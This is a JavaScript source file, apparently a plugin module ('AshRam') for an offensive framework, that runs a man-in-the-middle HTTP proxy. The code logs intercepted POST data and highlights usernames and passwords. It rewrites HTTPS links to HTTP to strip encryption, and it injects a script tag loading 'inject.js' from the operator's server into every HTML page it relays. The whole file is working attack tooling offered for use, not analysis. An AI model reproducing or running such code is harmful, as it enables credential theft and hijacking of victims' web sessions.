this.prefix = 'ashram'
this.call = function (args, mh) {
  var ashramport = 1337
  function replaceAll (str, find, replace) {
    var i = str.indexOf(find)
    if (i > -1) {
      str = str.replace(find, replace)
      i = i + replace.length
      var st2 = str.substring(i)
      if (st2.indexOf(find) > -1) {
        str = str.substring(0, i) + replaceAll(st2, find, replace)
      }
    }
    return str
  }
  function getPage (url, callback) {
    request.get(url, function (err, resget, body) {
      if (resget && resget.statusCode !== 404) {
        callback(err, resget, body)
      } else {
        if (url.search('http://') === -1) {
          url = 'http://' + url
        }
        request.get(replaceAll(url, 'http://', 'https://'), function (err, resget, body) {
          if (resget) {
            callback(err, resget, body)
          } else {
            callback(null, '', 'error')
          }
        })
      }
    })
  }
  if (args.length === 2) {
    var http = mh.require('http')
    var request = mh.require('request')
    var net = mh.require('net')
    var url = mh.require('url')
    var enableDestroy = mh.require('server-destroy')
    if (args[1] === 'start') {
      if (mh.varRet('ashramproxy')) {
        mh.clog('[AshRam] Proxy already running!'.red)
      } else {
        mh.clog('[AshRam] Starting AshramProxy on port '.green + ashramport.toString().green.bold + '...'.green)
        mh.varAdd('ashramproxy', http.createServer(function (req, res) {
          // http request
          req.on('error', function () {

          })
          try {
            if (req.method === 'POST') {
              var bodypost = ''
              req.on('data', function (chunk) {
                bodypost += chunk
              })
              req.on('end', function () {
                if (bodypost) {
                  bodypost = bodypost.toString()
                  if (bodypost.search('username') !== -1 || bodypost.search('password') !== -1 || bodypost.search('pass') !== -1 || bodypost.search('user') !== -1) {
                    mh.clog('[AshRam] Found some post data: '.green + bodypost.toString().yellow.bold)
                  } else {
                    mh.clog('[AshRam] Found some post data: '.green + bodypost.toString().blue.bold)
                  }
                }
              })
            }
            if (req.method === 'GET' && req.headers.accept.search('text/html') !== -1) {
              getPage(req.url, function (err, resget, body) {
                if (err) { mh.clog('[AshRam] Error: ' + err) }
                if (resget) {
                  if (resget.headers['content-type'] && resget.headers['content-type'].search('text/html') !== -1) {
                    mh.clog('[AshRam] Injecting into: '.green + req.url)
                    res.writeHead(resget.statusCode, resget.headers)
                    res.end("<script src='" + mh.config.ip + ':' + mh.config.webport + "/inject.js'></script>" + replaceAll(body, 'https://', 'http://'))
                  } else {
                    req.pause()
                    var options = url.parse(req.url)
                    options.headers = req.headers
                    options.method = req.method
                    options.agent = false
                    var connector = http.request(options, function (serverResponse) {
                      serverResponse.pause()
                      res.writeHeader(serverResponse.statusCode, serverResponse.headers)
                      serverResponse.pipe(res)
                      serverResponse.resume()
                    })
                    req.pipe(connector)
                    req.resume()
                  }
                } else {
                  res.end('error')
                }
              })
              reqgeterror.on('error', function () {
              })
            } else {
              req.pause()
              var options = url.parse(req.url)
              options.headers = req.headers
              options.method = req.method
              options.agent = false
              var connector = http.request(options, function (serverResponse) {
                serverResponse.pause()
                res.writeHeader(serverResponse.statusCode, serverResponse.headers)
                serverResponse.pipe(res)
                serverResponse.resume()
              })
              req.pipe(connector)
              req.resume()
            }
          } catch (err) {
          }
        }))
        mh.varRet('ashramproxy').on('connect', function (req, cltSocket, head) {
          req.on('error', function () {

          })
          cltSocket.on('error', function () {

          })
          try {
            var srvUrl = url.parse(`http://${req.url}`)
            var srvSocket = net.connect(srvUrl.port, srvUrl.hostname, function () {
              cltSocket.write('HTTP/1.1 200 Connection Established\r\n' +
              'Proxy-agent: Node.js-Proxy\r\n' +
              '\r\n')
              srvSocket.write(head)
              srvSocket.pipe(cltSocket)
              cltSocket.pipe(srvSocket)
            })
            srvSocket.on('error', function () {

            })
          } catch (err) {
            // mh.clog('[AshRam] '.red + err.red);
          }
        })

        mh.varRet('ashramproxy').listen(ashramport, function () {
          mh.clog('[AshRam] AshramProxy started successfully on port '.green + ashramport.toString().green.bold + '.'.green)
        })
        enableDestroy(mh.varRet('ashramproxy'))
      }
    } else if (args[1] === 'stop') {
      mh.varRet('ashramproxy').unref()
      mh.varRet('ashramproxy').destroy()
      mh.varDel('ashramproxy')
      mh.clog('[AshRam] Closed proxy.'.green)
    } else {
      mh.clog('[AshRam] Invalid arguments!'.red)
    }
  } else {
    mh.clog('[AshRam] Not enough arguments supplied!'.red)
  }
}
